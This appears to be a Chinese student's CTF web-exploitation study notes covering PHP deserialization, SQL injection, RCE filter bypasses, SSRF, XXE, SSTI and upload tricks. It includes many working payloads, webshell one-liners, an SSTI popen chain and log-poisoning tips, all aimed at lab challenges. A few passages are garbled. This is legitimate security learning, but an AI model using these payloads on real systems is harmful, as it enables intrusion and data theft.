3、采用0e开头数字（弱类型比较）

php会将0e开头的数字转化为0

##### [BJDCTF 2020]easy_md5

bp抓包发现hint: **select * from 'admin' where password=md5($pass,true)**

md5函数在指定了true的时候，返回的原始 16 字符二进制格式。

传入password=ffifdyop经md5加密后为276f722736c95d99e921722cf9ed621c再转换为字符串即为：’or‘6+乱码即构造sql永真注入，往后即是MD5数组绕过

#### **[鹤城杯 2021]EasyP

**$_SERVER[‘PHP_SELF’]** ：正在执行脚本的文件路径

**$_SERVER[‘REQUEST_URL’]** ：同上，不过会加上传入的参数，且不会进行URL编码

**basement()函数**：返回路径中的最后一个**/**后的文件名

**利用**：`basename()` 会删除文件名开头的非 ASCII 字符（如中文）

index.php文件下包含其它php文件。

可用**[     (空格)      +        .**任意一个绕过正则匹配中的_。

#### [GDOUCTF 2023]反方向的钟

比较综合的题，考了**反序列化，文件读取，php伪协议**

但是把我困住的是调用**原生SplFileObject 类**，配合php伪协议读flag

#### php反序列化

##### ** [NISACTF 2022]babyserialize

POP链（代码审计时，在源代码中将顺序标好，先找到**入口**、**出口**）

**写法**：由出口向入口顺序依次通过参数创建新的类，原类参数可在原有类中命名或由新的参数调用命名，在每个类中要找到进入下个类的参数并对此参数赋新类值

<u>首先找可执行代码（eval等）或能读出文件的地方，亦或是能调用函数的地方</u>

代码审计后找到eval（）函数，发现可通过$txw4ever传入代码执行命令，调用该函数的前提是调用 _invoke（）魔术方法

要调用 _invoke（）则需将对象调用为函数，发现类liovetxw下有将对象$bb调用为函数$bb()，而前提是调用__toString()

发现类four中有使用strlower（）将$a当作字符串使用，此处需将$fun赋值为sixsixsix以绕过分支，而想进入此步需调用__set（）

又发现类liovetxw下对不存在的对象$fun赋值故能调用 _set（），想进入此处又需调用 _call（）

发现在类TianXiWei中调用了不存在的方法nisa（）而前提是调用__wakeup()，故需进行反序列化操作。

最后还提示了两个**过滤**

第一个（if判断）只需修改fun值即可绕过

第二个正则匹配暗示存在过滤，首先猜测是关键词过滤（关键词、符号，只能按照一定的策略去尝试），最后测试发现是过滤关键词命令执行代码system，通过大小写绕过

GET传参时还要进行urldecode() 编码

编写payload时通过调用魔术方法下的**对应参数**成功构建POP链

##### [SWPUCTF 2021 新生赛]pop

```php
public function __toString(){    
    $this->w00m->{$this->w22m}();    
    return 0;  
}
```

可通过对w22m赋方法名，然后调用目标方法

入口：执行反序列化调用__ wakeup()或 __ destruct()，故入口在类w22m

然后由echo调用了__toString()故进入w33m，最后目标是进入w44m，调用Getflag()，故直接对对w22m赋方法名，调用目标方法。对变量赋相应值构造exp

##### [HUBUCTF 2022 新生赛]checkin

**数组的反序列化**：

```php
<?php
show_source(__FILE__);
$username = "this_is_secret"; 
$password = "this_is_not_known_to_you"; include("flag.php");//here I changed those two 
$info = isset($_GET['info'])? $_GET['info']: "" ;
$data_unserialize = unserialize($info);
if($data_unserialize['username']==$username&&$data_unserialize['password']==$password){  
    echo $flag;
}else{  
    echo "username or password error!";}?>
```

payload：

```php
<?php
$info = array(
	'username'=>true,
	'password'=>true
);
$serialized_data = serialize($info);
echo  $serialized_data ;
?>
```

##### [NISACTF 2022]popchains

```php
<?php
class Road_is_Long{ 
  public $page;
  public $string;
}
class Try_Work_Hard{
  protected $var = '/flag';//或者php://
}
class Make_a_Change{
  public $effort;
}

$a = new Try_Work_Hard;
$b = new Make_a_Change;
$b -> effort = $a;
$c = new Road_is_Long;
$c -> string = $b;
$c -> page =$c;
echo urlencode(serialize($c));
?> 
```

##### prize_p5

首先代码审计：

前面给了3个类，没啥可用的魔术方法，应该不是构造pop链；

接着是一个过滤器，通过**替换字符**过滤，有点字符串逃逸的感觉，接着是一个get传参以及判断，里面有序列化和反序列化，不知道有啥用

接着往下还包含了一个对参数的**实例化**，并通过POST传参为其中的属性赋值，然后就对该参数进行序列化（这不就是把该自己写的代码搬到题目上了吗。。序列化后**将数据进行过滤**（基本可以确认了），然后还对phone是否是数组进行判断（要将phone属性赋值为数组）

**tip**：这里有点小坑，s:5:"phone";**a:1:{i:0;s:3:"hacker";}**，所以最后构造逃逸时还要加上一个**}**，才能闭合！！、

最后就是算一算，构造字符串上传即可，另外第一个GET传参唯一的作用就是满足有值进入分支即可，所以可随意赋值

paylaod：

name=test&**phone[]**=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello**";}**s:5:"email";s:5:"/flag";}&email=test

**非预期解**：

果然是我学的少了，GET传参有有可利用catalogue类中的 __destruct配合元素类进行文件读取。这个解法有好多东西我都不知道。。。不想正常解，困住我的只是字符串数组的闭合条件。

```php
    public function __destruct()
    {
        echo new $this->class($this->data);
    }
```

首先：

```php
O:9:"catalogue":2:{s:5:"class";s:18:"FilesystemIterator";s:4:"data";s:11:"glob:///fl*";}
```

**FilesystemIterator类**用来读取根目录有哪些文件，但**只能读取文件名**的，所以要配合**glob协议**来找到flag的文件名。（完全不知道啊）

然后：

```php
O:9:"catalogue":2:{s:5:"class";S:13:"SplFileO\62ject";s:4:"data";s:5:"/flag";}
```

SplFileObject类读文件内容，但是object被过滤

**原理**：为了方便数据的传输，反序列化内容中大写的S表示字符串，可以识别内容里的**十六进制**所以用\ **62**代替b完成类似拼接的效果，进而读到flag。

**利用**：

##### [UUCTF 2022 新生赛]ez_unser

比较简单的反序列化，主要涉及wakeup的绕过（但不是考这个）

因为类中有：

```php
public function __wakeup(){    
    $this->a='';  
}
```

```php
public function __destruct(){    
    $this->b=$this->c;    
    eval($this->a);  
}
```

所以想要绕过wakeup

但是：

```php
if(!preg_match('/test":3/i',$a)){  
    die("你输入的不正确！！！搞什么！！");
}
```

限制了不能通过常规方法绕过

所以可以通过$b和$a**共享内存空间**（考的都不是web了），在反序列化的最后由参数c为a赋值

```php
$t=new test();
$t->b=&$t->a;
$t->c="system('cat /f*');";
```





#### ZJCTF 2019]NiZhuanSiWei

**file_get_contents()**：这个函数就是把一个文件里面的东西 （字符）全部return出来作为字符串。但是这个函数如果直接把字符串当作参数会报错，但如果**包含**的是http协议的网址，则会像`curl`命令一样，把源码读出来。

故可用php://input或data://协议绕过

往下对参数file正则匹配过滤了flag，然后下有提示可由文件包含通过file读取useless.php的内容

使用php://filter协议

最后是简单的反序列化

#### [极客大挑战 2020]welcome（？）

1.In addition to the GET **request method**, there is another common request method...
2.Learn something about **sha1** and **array**.
3.Check phpinfo more carefully and you will find where the flag is.

#### [NSSCTF 2022 Spring Recruit]babyphp

```php
if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a']))
```

令a[]=1，数组绕过**正则**和**intval**函数



#### * [HCTF 2018]Warmup ktrol

**in_array()** 函数搜索数组中是否存在指定的值。

**mb_substr()** 函数返回字符串的一部分，substr() 函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()

**mb_strpos** — 查找字符串在另一个字符串中首次出现的位置

#### **[GDOUCTF 2023]受不了一点

**foreach遍历数组**：
 $_POST as $key => value和$key = value;（注意这里value只有一个value;（注意这里value只有一个的意思是把post进去的数组键名作为变量，数组中的键值作为变量的值
 举个荔枝：假如先设置了一个变量a=a,然后post传入a=b,那么就会把前面a=a,然后post传入a=b,那么就会把前面a的值**覆盖**掉变成a=b，foreach(a=b，foreach(_GET as $key => value) {$key = $$value;     }  //（注意这里value有2个同上，假如先设置了一个变量同上，假如先设置了一个变量a=a，,然后get传入a=b,那么就会把前面a的值覆盖掉变成a的值覆盖掉变成a=$b
 思路：由于题目已经设置了flag，所以我们要做的是不覆盖flag的值
 那么下面看看payload是什么意思：
 post：1=flag则变成->>$1=flag
 get：1=flag&flag=1先传一个1=flag则变成->>1=flag,然后传入：flag=1，变量覆盖之后就变成−>>1=flag,然后传入：flag=1，变量覆盖之后就变成−>>flag=$1(由于1=flag，所以会变成：1=flag，所以会变成：flag=$flag这样就不会把flag的值覆盖

#### ** [鹤城杯 2021]Middle magic

```php
 $aaa = preg_replace('/^(.*)level(.*)$/', '${1}<!-- filtered -->${2}', $_GET['aaa']);   
if(preg_match('/pass_the_level_1#/', $aaa))
```

正则匹配单行模式`(?s)`下 ，`.`号将匹配所有字符，包括换行符；但默认情况下**点号**不匹配换行符，因此可能绕过(**.***)。（注意#需url编码即%23）

利用json_decode()的缺陷与php弱类型比较，json_decode()函数用于对json格式数据进行json解码操作，对于一个json类型的字符串，会解密成一个数组

```php
$level_3 = json_decode($_POST['level_3']);                     if ($level_3->result == $result)
```

故只要包含’result‘皆可通过弱类型比较

构造level_3={‘result’:x}（x可为任意字符组合）

#### [WUSTCTF 2020]朴实无华

```php
 if(intval($num) < 2020 && intval($num + 1) > 2021)
```

在不加1的情况下`"1e10"`会被认为是字符串，然后intval(“1e10”)后就是1

当字符串`"1e10"`+`1`，`"1e10"`会自动转换成整数，即1乘10的10次方再加上1

然后是MD5弱类型0e绕过，最后直接命令执行

#### [SWPUCTF 2022 新生赛]numgame debug002

范围解析操作符 （::）： 调用类中的静态方法或者常量



#### *[LitCTF 2023]作业管理系统(有些意思)

#### **[NISACTF 2022]bingdundun~

**phar协议伪**：php解压的一个函数，不管后缀是什么，都会当做压缩包来解压



#### [NISACTF 2022]babyupload

**os.path.join(path, *paths)**函数用于将多个文件路径连接成一个组合的路径。第一个参数通常包含了基础路径，而之后的每个参数都被当做组件拼接到基础路径后。如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将被视为绝对路径。下面的示例揭示了开发者可能遇到的这个陷阱。

payload：filename=/flag

#### [GXYCTF 2019]BabyUpload

.htaccess的MIME绕过

**<?**标志绕过：写入前端语言<script language='php'>@eval($_POST['x']);</script>

#### [NSSRound#8 Basic]MyDoor

php伪协议读index文件

php特性：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候，php会将怪异的变量名转换成有效的，在进行解析时会删除空白符，并将空格、+、点、[ 转换为下划线。但是用一个特性是可以绕过的，就是当 [ 提前出现后，[ 会转换成下划线，而后面的字符就不会再被转义了。

传入`?N[S.S=system('env')`

#### 变量覆盖

##### [MoeCTF 2022]ezphp

为防止flag值被修改，先将flag值赋给一个新变量，然后再还原

**?a=flag&flag=a**

#### [红明谷CTF 2021]write_shell

代码审计：

两个过滤器，一个正则匹配字符，一个waf检测数组

#### [鹏城杯 2022]简单包含

脏数据绕过waf

### 源码泄露

#### [LitCTF 2023]Vim yyds

扫目录发现**.index.php.swp**（是使用vim编辑未成强制退出后的遗留文件），在kali中使用vim -r .index.php.swp恢复文件。

其中有一串php代码，很简单的代码，没啥好说的。。。

### SQL

#### *** [LitCTF 2023]这是什么？SQL ！注一下 ！

法一:构造单引号以及多括号闭合，然后**正常流程**注入即可（记得**url编码**），然后有两个库，正确的flag在ctftraining库中。

法二：

**getshell**：



#### ** [suctf 2019]EasySQL d4v1d（有问题）

<u>show databases时缺少了表Flag</u>

sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数
 当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数
 第一种就按默认没有配置来进行，此时||就是逻辑或

根据回显输入除了0以外的数字返回1，输入0和字母时回显0,大佬可以猜出后台执行方式

```bash
select $_POST[query]||flag from Flag
```

构造` *,1 `

为·select *,1||flag from Flag即select *，1 from Flag

#### [SWPUCTF 2021 新生赛] easy_sql

测试时发现过滤了空格和等号，空格可用/**/替代或用括号连接各个命令；等号可用like替代然后是常规的联合查询，在查数据是发现回显有截断，可用SQL MID() 函数SELECT MID(column_name；start（查询起始，默认1）；length（查询长度）)。此外left（）、right（）、mid（）

见于[极客大挑战 2019]HardSQL

#### ** [NISACTF 2022]join-us

**无列名注入**

**报错注入**：测试发现过滤了order、**union**，而且各种关键字绕过也没用，考虑报错注入，发现extractvalue可以用。

tip：明明or没有被过滤，但就是没法用，用**||**代替

**爆库名**：

1'||extractvalue(1,concat(0x7e,**mid**((select group_concat(schema_name) from information_schema.schemata)**,1,20**)))#

爆出一堆库名，我一开始觉得应该是ctftraning库，但是在后面无列名注入时发现这个库是假的

**改良**：通过查一个不存在的表来爆库名

```sql
1'||(select *from aa)#
```

报表名：

1'||extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like 'sqlsql')))#

**爆字段**（无列名注入）：

column被ban了，查不到列名，通过join爆字段

```sql
1'||extractvalue(1,concat(0x7e,(select *from (select *from output a join output b)c)))#
```

output是查出来的表名

最后发现flag在data字段获得flag

1'||extractvalue(1,concat(0x7e,mid((select data from output),1,20)))#

#### [SWPUCTF 2022 新生赛]ez_sql

POST传参，过滤了or、union（**双写绕过**）空格（/**/ ）

最后：nss=2'/**/ununionion/**/select/**/1,2,Secr3t/**/from/**/NSS_tb#

#### [NCTF 2018]滴!晨跑打卡

空格过滤，用**%a0**绕过，然后注释符也被过滤，在最后**构造单引号闭合**绕过即可

payload：

id=1'%a0union%a0select%a01,2,**(select%a0group_concat(table_name)from%a0information_schema.tables%a0where%a0table_schema=database())**,4'

在中间再次构造select语句并闭合，习惯养好，其它有的题不用这样也能查出来，但是这道题就必须这样才能查出来，烦死了！！

#### [GXYCTF 2019]BabySqli

又学到了：

**联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据**

测试的时候发现这道题的注入点在name处，然后过滤了括号，也就是说只能用联合查询，果然没有过滤union，测出有三列。

payload：

name=1' union select 1,**'admin','c4ca4238a0b923820dcc509a6f75849b'**# &pw=1

加粗部分就是要构造的数据，测试的时候发现admin是正确的用户名，所以通过联合查询，为admin又插入了一个新的密码数据，其中c4ca4238a0b923820dcc509a6f75849b是1的**md5**编码值（至于为什么是md5，可能密码基本上都是md5加密吧），给pw数组传值有md5提示，但是鬼知道为什么要怎么做。

### RCE

####  [SWPUCTF 2021 新生赛]hardrce

过滤了许多特殊符号和所有的字母

故在异或和取反中选择**取反绕过**

因cat时linux命令，故在使用cat等命令查看flag时要使用system等系统命令调用，并且查看的是/f*目录，且在最后要使用；闭合命令

#### [SWPUCTF 2021 新生赛]hardrce_3

**自增绕过**

再构造构造: _ =file _ put _ contents("1.php","<?php eval(\$_POST['shell']); ?>");

iunx的正确的写马方式：在linux里面写马<?php eval($_POST[‘shell’]); ?>，输出会发现只有<?php eval(); ?>，加一个\代表转义

#### * [UUCTF 2022 新生赛]ez_rce

system = **``**(执行命令)+print（打印命令执行后的内容）

正则过滤关键字用 \ 绕过

payload：?code=print_r(`nl /fffffffffflagafag`);

#### [GXYCTF 2019]Ping Ping Ping

rce黑名单空格/字符/黑名单绕过

```php
< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
```

**linux内联执行：127.0.0.1|cat$IFS`ls`**本题有效

`base64编码绕过：127.0.0.1;echo$IFS8Y2F0IGZsYWcucGhw∣base648Y2F0IGZsYWcucGhw∣base64IFS$8-d|sh

拼接

#### [SWPUCTF 2021 新生赛]finalrce

#### 无回显RCE

1、linux tee命令用于读取标准输入的数据，并将其内容输出成文件。如ls /|tee 1.txt，然后访问该文件即可。

2、DNS/HTTP请求（不太懂）

代码是关键字过滤，用单引号或者转义\绕过即可

#### ** ** [NISACTF 2022]middlerce

**PCRE绕过**

格式类似：

```php
preg_match('/<\?.*[(`;?>].*/is', $data)
```

NFA正则引擎会从起始值开始依次读取，重点是**.***会匹配任意字符，导致最后的[**(`;?>**]字符匹配不上，此时正则就会逐个字符回溯，直到匹配到最后的字符。

利用原理：

PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个**回溯次数上限** pcre.backtrack_limit。若回溯次数超过100万，**preg_match 返回 false**，即可绕过preg_match

 payload（搞不太明白为什么这样子写！！！）：

```python
import requests
url = 'http://node4.anna.nssctf.cn:28965/'
payload='{"cmd":"?><?= `tail /f*`?>","test":"' + "@"*(1000000) + '"}'
res = requests.post(url,data={"letter":payload})
print(res.text)
```

#### [HNCTF 2022 WEEK2]easy_include

进来提示要懂得搜索，感觉不像是常规的RCE题目

发现是**文件包含漏洞**，但是php伪协议被ban了，还有file协议可以搞一搞，搞不出。。。不能直接读文件，命令注入也不太行，小括号无了，+、^、~都无了，实在搞不懂怎么搞了。。。

**原理**：

当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会**利用日志文件**来入侵。
  **日志文件记录用户的操作，并且写到访问日志文件之中。**

在不同的系统，存放日志文件地方和文件名不同
 **apache**一般是/var/log/apache/access.log

**nginx**的log在/var/log/nginx/access.log和/var/log/nginx/error.log

**文件包含**：只要文件中有php代码，它就会把这个文件当做php脚本进行解析。

**利用**：通过包含日志文件，让目标服务器把日志文件解析为php脚本

通过文件包含日志文件，通过burp在user-agent处写入一句话木马。但是我死命做不出来！！！！

#### [NSSRound#8 Basic]MyDoor

使用php伪协议读到index文件，发现可通过GET传参N_S.S直接命令注入

**但是**：

**php解析特性**：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候，php会将怪异的变量名转换成有效的，在进行解析时会删除空白符，并将空格、+、点、[ 转换为下划线。

**利用**： [ 提前出现后，[ 会转换成下划线，而后面的字符就不会再被转义了。

所以通过**N[S.S**传参

另外关于不知道flag文件名，可直接查**env**（系统环境变量）

#### SWPUCTF 2022 新生赛]webdog1__start

首先是一个md5比较，$ _==md5($ _)   直接令 _=0e215962017，科学计数法判断为零。

然后是多次在回应头给提示，利用好bp抓包查看即可，最后是命令注入，过滤了空格（url编码绕过）和flag，以及有字符长度限制，直接上传一句话，通过GET传参获得flag

payload：?get=eval($_GET _]);& _=system('cat%20/f*');

#### ** [鹏城杯 2022]简单的php

先是**无字母数字**的正则匹配（只剩**取反绕过**），且限制了payload长度（应该是限制后面的无参RCE的，不能直接读文件，而要先搞一个shell）

然后是一个无参RCE，传入后门代码system(current(getallheaders()));

然后在http头操作：

**Flag**(任意参数)：cd../../../;ls（找flag文件）       cd../../../;cat ....（）查看

payload：

```php
?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())); 
```

加[!%FF]因为二维数组进行拼接必须有用[!%FF]进行分隔

### SSRF（不太熟悉）

#### [HNCTF 2022 WEEK2]ez_ssrf (伪造请求头)

```php
fsockopen($hostname,intval($port),$error,$errstr,30)
    
```

**fsockopen()** 函数是用于建立一个 **socket 连接**

**fwrite()**将data写入当前会话
 构造一个请求头，读取服务器本地文件

```php
<?php
$out = "GET /flag.php HTTP/1.1\r\n";
$out .= "Host: 127.0.0.1\r\n";
$out .= "Connection: Close\r\n\r\n";
echo base64_encode($out);
?>
```

1. **hostname** 如果安装了OpenSSL，那么你也许应该在你的主机名地址前面添加访问协议ssl://或者是tls://，从而可以使用基于TCP/IP协议的SSL或者TLS的客户端连接到远程主机。 
2. **port** 端口号。如果对该参数传一个-1，则表示不使用端口，例如unix://。 
3. **errno** 如果errno的返回值为0，而且这个函数的返回值为 FALSE ，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误。 
4. **errstr** 错误信息将以字符串的信息返回。 
5. **timeout** 设置连接的时限，单位为秒。

#### [GKCTF 2020]cve版签到

**cve-2020-7066**: 在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。

#### [HNCTF 2022 WEEK2]ez_ssrf

```php
 <?php

highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];

$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) {
    die();
}
else {
    fwrite($fp,$data);
    while(!feof($data))
    {
        echo fgets($fp,128);
    }
    fclose($fp);
} 
```

代码审计：接受GET传参数据，并通过**fsockopen（）**函数与主机及端口建立socket连接，然后将base64解码的数据写入连接中，在循环中将读到的数据返回给浏览器。

**利用**：通过请求flag文件，将文件内容返回到本地浏览器中。

其中data要构造为请求文件的请求头：

```sql
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
```

然后进行base64加密

**payload**：

host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjEKQ29ubmVjdGlvbjoga2VlcC1BbGl2ZQ==

### XML

#### [NCTF 2019]Fake XML cookbook（xxe任意文件读取）

<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///flag">
  ]>
<user><username>&admin;</username><password>123456</password></user>
username处是&admin；
#### [NCTF2019]True XML cookbook

直接采取上面的恶意xml外部实体查看flag，发现报错，可能是路径错误，尝试读取源码：file:///**var/www/html/**doLogin.php，没有报错但也没有读到任何东西，可能不能用file协议读取，尝试php伪协议，成功读取到源码，但是没有任何有用的信息，只有写入文件内容的功能性代码

tips：

xxe可以内网探测存活的主机，获取/etc/hosts文件，关键文件分别是：**/etc/hosts 和 /proc/net/arp**，也就是当主机上没有flag时，可以由hosts文件查看内网的主机是否有flag，通过爆破主机地址进行访问

### SSTI

#### [CISCN 2019华东南]Web11

php **smarty 模板注入**，通过XFF控制IP，在此处造成注入

#### [HDCTF 2023]SearchMaster

同上，先扫目录，在composer.json找到此处是smarty模板

用{if system('ls')}{/if}无flag，因在根目录下

用{if system('ls /f*')}{/if}找到flag路径

用{if system('cat /flag_13_searchmaster')}{/if}得到flag

#### *** [安洵杯 2020]Normal SSTI

用{{5*6}}测试，发现被过滤，用{}测试通过，故判断过滤了**{{}}**





#### [HZNUCTF 2023 preliminary]flask

将注入的命令倒序了，没有waf，正常注入将命令倒序即可，但是就是注不进去。。。

#### *** [GDOUCTF 2023]<ez_ze>

控制语句注入，attr（）过滤器

**{%...%}**：直接测试{{7*7}}发现双大括号被过滤了，用**{%if 2>1%}right{%endif%}**可以注入。所以此题用控制语句注入。

再测试发现_、点、中括号都被过滤了，但是|没有被过滤，只能用过滤器**attr（）**注入

**payload**：

加粗两行必须得加，不知道为什么这么写？？？先保存在这吧。。。

**{% set po=dict(po=a,p=b)|join%}**
**{% set a=(()|select|string|list)|attr(po)(24)%}**
{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}
{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}
{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}
{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}
{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}
{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}
{%set pp=dict(pop=a,en=b)|join %}
{%print({}|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(132)|attr(ini)|attr(glo)|attr(geti)(pp)('tac /flag')|attr('read')() )%}

还原一下就是：

{{{}.__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(‘popen’)('tac /flag').read()}}

### CMS

#### [GKCTF 2021]easycms

### 文件操作

#### [UUCTF 2022 新生赛]ez_upload

**apache解析漏洞**：为Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）,可用来绕过黑名单过滤。

利用：a.jpg,php

然后又MIME验证，文件头绕过，但是搞不懂为什么测试的文件上传一个就说已存在？？？

#### [SWPUCTF 2022 新生赛]Ez_upload

上传php文件报错，后缀不能含ph，所以尝试**.jpg**等绕过，还是不行（加上文件头也一样），图片马懒得试，尝试短标签绕过，成功，果然对?><?有检测，但是进入路径发现命令根本没写进去，说什么图片损坏，这种情况可以通过修改配置文件，增加一个新的文件类型当作php文件执行（图片类型试了不行，命令根本写不进去），最后上传了一个**a.zz**文件，并通过.htaccess绕过成功执行，在phpinfo中找到flag。

总结：如果一般绕过不行，但是配置文件又能正常上传可以写一个新的文件类型当作p'h'p

#### [NSSRound#8 Basic]MyPage

一进来就是index.php?file=

一看就知道是文件包含，尝试php伪协议读，发现读不出来，尝试php://input写入一句话木马，依旧不行，然后wp给出有可能考的是一次包含，通过网上给的payload成功绕过，但是这个方法的原理实在搞不懂啊。。

#### [WUSTCTF 2020]CV Maker

整的花里胡哨，但其实不难，上传php文件，发现有exif_imagetype检测文件头，添加文件头后上传php文件轻松绕过，进去后发现对<?进行了过滤，重新改一下短标签绕过，最后在phpinfo中找到flag
